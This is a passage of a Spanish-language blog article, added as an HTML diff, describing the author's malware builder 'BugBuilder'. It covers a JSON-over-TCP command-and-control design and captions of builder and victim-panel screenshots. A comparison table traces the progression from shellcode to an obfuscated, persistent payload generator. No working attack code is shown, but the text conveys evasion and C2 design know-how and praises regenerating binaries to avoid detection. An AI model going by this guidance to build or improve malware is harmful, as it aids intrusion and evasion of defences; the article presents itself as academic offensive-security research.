+
+        <h3 class="subsection-title">La conexión con el C2</h3>
+        <p>
+            Una vez generado el <span class="mono">.exe</span>, debía reportar a casa. La decisión técnica fue utilizar un formato de serialización ligero (JSON) sobre TCP. Se implementó un modelo de datos (<span class="mono">ModelInfo</span>) para mapear la información de la víctima (IP, país, hostname, SO, ping) y visualizarla en un <span class="mono">GridView</span>.
+        </p>
+        <div class="code-block">
+            <span class="line"><span class="comment">// Log: 24/1/24 11:15 p. m.</span></span>
+            <span class="line"><span class="string">"Me hice un cliente provisional para debuggear, de momento se me ocurre enviar todo como un JSON y al llegar al Servidor (o viceversa) mappearlo a un objeto xd"</span></span>
+            <span class="line">&nbsp;</span>
+            <span class="line"><span class="string">"Lo que creo que voy a necesitar es una flag para indicar el tipo de configuracion y evaluar si amerita decodificado, descompresion o desencriptado xd"</span></span>
+        </div>
+
+        <div class="callout">
+            <div class="callout-title mono">El problema de las "flags"</div>
+            <p>La necesidad de una flag para evaluar el pipeline de procesamiento demuestra una comprensión temprana de los protocolos de comunicación maliciosa avanzados. No es suficiente enviar datos; el binario y el servidor deben negociar si el tráfico está codificado, comprimido o cifrado, tal como se ve en la UI final con las opciones de Encode/Compress/Encrypt. Esta negociación es lo que permite que el C2 sea flexible y resistente a cambios en las defensas del target.</p>
+        </div>
+
+        <h3 class="subsection-title">La trampa del "todo en strings"</h3>
+        <p>
+            En septiembre de 2024, reflexioné sobre la arquitectura del builder. La primera iteración almacenaba todo el código fuente del payload como strings literales en los recursos, con las herramientas de compilación incrustadas. Este enfoque, aunque funcional, era frágil: cualquier cambio en la lógica del payload requería modificar cadenas largas y propensas a errores de sintaxis. La lección fue que el builder debía ser más modular, con plantillas parametrizables en lugar de código fuente hardcodeado.
+        </p>
+        <div class="code-block">
+            <span class="line"><span class="comment">// Log: 16/9/24 11:15 p. m.</span></span>
+            <span class="line"><span class="string">"Es que pensé que era como un builder, la última vez que intenté hacer un builder opte por dejar todo el código en string y las herramientas de compilación en el resources"</span></span>
+        </div>
+
+        <!-- ==================== SECCIÓN 7: LA UI EN ACCIÓN ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">07.</span> Galería de la UI: Anatomía de BugBuilder</h2>
+
+        <p>
+            Las siguientes imágenes documentan el estado final de la PoC. Representan la materialización de los conceptos discutidos en la bitácora: un generador de payloads con su propio panel de comando y control.
+        </p>
+
+        <h3 class="subsection-title">Interfaz de Construcción (Builder)</h3>
+        <div class="image-container">
+            <img src="img/bugbuilder-0.png" alt="Pestaña Builder de BugBuilder mostrando configuración de red, ofuscación y entrega del payload" loading="lazy">
+            <div class="image-caption mono">bugbuilder-0.png — Pestaña Builder. Se observa la configuración de red (Host, Puerto 3323), las opciones de Encode Traffic (Base64, XOR), Compress Traffic (Deflate, GZip, LZW, Huffman, RLE, LZMA) y Encrypt Traffic (AES, RSA). En la parte inferior, la sección Set Up Delivery permite asignar nombre al archivo ("Bug") y seleccionar un ícono de camuflaje. El botón "Build" inicia la generación del ejecutable malicioso utilizando el compilador interno CodeDOM.</div>
+        </div>
+
+        <h3 class="subsection-title">Panel de Control Vacío (Infected)</h3>
+        <div class="image-container">
+            <img src="img/bugbuilder-1.png" alt="Pestaña Infected de BugBuilder sin conexiones, mostrando las columnas del grid" loading="lazy">
+            <div class="image-caption mono">bugbuilder-1.png — Pestaña Infected en estado inicial. La grilla está vacía, esperando conexiones entrantes. Las columnas definen la información que se extraerá de las víctimas: IP, Country, User@PC, Status, Operating System y Ping (ms). Esta vista representa el panel de Comando y Control (C2) antes de que el payload sea desplegado.</div>
+        </div>
+
+        <h3 class="subsection-title">Conexión Exitosa (C2 Activo)</h3>
+        <div class="image-container">
+            <img src="img/bugbuilder-2.png" alt="BugBuilder en funcionamiento con un cliente conectado desde Venezuela" loading="lazy">
+            <div class="image-caption mono">bugbuilder-2.png — Prueba de concepto en funcionamiento. El servidor escucha en 0.0.0.0:3323. Se ha recibido una conexión de un cliente de prueba: IP 192.168.1.10, País Venezuela, Hostname DESKTOP-ABCDE, Sistema Operativo Windows 10, con un ping de 45 ms. En la ventana de fondo se aprecia la consola del cliente de pruebas (ClientTCPTest.exe) ejecutándose, simulando la máquina víctima. Esta captura valida la arquitectura completa del proyecto.</div>
+        </div>
+
+        <!-- ==================== SECCIÓN 8: LÍNEA DE TIEMPO DEL APRENDIZAJE ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">08.</span> Conclusión: Del Byte al Framework</h2>
+
+        <p>
+            La progresión de <strong>winshellcode-</strong> a <strong>BugBuilder</strong> representa un arco de aprendizaje fundamental en el desarrollo de software de seguridad ofensiva. Se pasó de entender la microarquitectura de una pila de llamadas a abstraer esa lógica en una fábrica de binarios.
+        </p>
+
+        <h3 class="subsection-title">Tabla comparativa de la evolución</h3>
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Característica</th>
+                        <th class="mono">winshellcode- (Fase 1)</th>
+                        <th class="mono">Stub Cripto (Fase 2)</th>
+                        <th class="mono">BugBuilder (Fase 3)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Lenguaje</strong></td>
+                        <td class="mono">C + Assembly (NASM)</td>
+                        <td class="mono">Assembly (NASM)</td>
+                        <td class="mono">C# (.NET Framework)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Payload</strong></td>
+                        <td>Shellcode fija (<span class="mono">calc.exe</span>)</td>
+                        <td>Shellcode variable descifrada</td>
+                        <td>Payload configurable con persistencia</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Ofuscación</strong></td>
+                        <td>Opcodes en bruto</td>
+                        <td>XOR multibloque con llaves</td>
+                        <td>Compresión, Cifrado (AES/RSA), Iconos camuflaje</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Comunicación</strong></td>
+                        <td>Ninguna (Ejecuta y termina)</td>
+                        <td>Ninguna</td>
+                        <td>C2 TCP bidireccional con JSON</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Resolución API</strong></td>
+                        <td>Manual (<span class="mono">GetProcAddress</span> + parcheo little-endian)</td>
+                        <td>Syscalls directas (<span class="mono">int 0x80</span>)</td>
+                        <td>Automática (.NET P/Invoke o Referencias)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Generación de binario</strong></td>
+                        <td>Compilación externa (GCC)</td>
+                        <td>Ensamblador externo (NASM)</td>
+                        <td>Compilación interna (CodeDOM / Roslyn)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <p>
+            El primer proyecto nos enseñó el valor de la precisión manual: saber exactamente qué bytes ocupa una instrucción y cómo la pila afecta al flujo. El segundo proyecto añadió la capa de protección de la carga útil, entendiendo que la shellcode en reposo es la parte más vulnerable del ciclo de vida de un payload. Finalmente, BugBuilder operacionalizó ese conocimiento, convirtiendo un arte técnico en una herramienta modular lista para entornos hostiles, donde la capacidad de regenerar binarios con firmas diferentes es la diferencia entre el éxito y la detección.
+        </p>
+
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="social-links mono">
+                <a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">github/tty503</a>
+                <a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">linkedin/tty503</a>
+                <a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">x/tty_503</a>
+                <a href="https://tty503.com">tty503.com</a>
+            </div>
+            <p class="copyright">© <span id="current-year"></span> Christian Márquez. Artículo técnico — Prácticas de Malware Dev. Información recopilada y generada con fines académicos y de investigación en seguridad ofensiva.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('current-year').textContent = new Date().getFullYear();
+
+        const navbar = document.querySelector('.navbar');
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 50) {
+                navbar.style.background = 'rgba(3, 3, 3, 0.9)';
+            } else {
+                navbar.style.background = 'rgba(3, 3, 3, 0.75)';
+            }
+        });
+    </script>
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "headline": "De la Shellcode Artesanal al C2 Builder: Anatomía de un Dropper y su Metamorfosis en Framework",
+      "author": {
+        "@type": "Person",
+        "name": "Christian Márquez",
+        "url": "https://tty503.com"
+      },
+      "datePublished": "2026-05-22",
+      "dateModified": "2026-05-22",
+      "description": "Análisis de la creación de un dropper de shellcode en C/Assembly para WinExec/ExitProcess y su evolución a un constructor de malware con panel C2, ofuscación y persistencia en C#.",
+      "keywords": ["shellcode", "WinExec", "ExitProcess", "kernel32", "dropper", "C2", "Malware Dev", "C#", ".NET", "TCP", "reverse engineering", "little-endian", "assembly", "Mingw-w64", "BugBuilder", "tty503"]
+    }
+    </script>
+</body>
+</html>
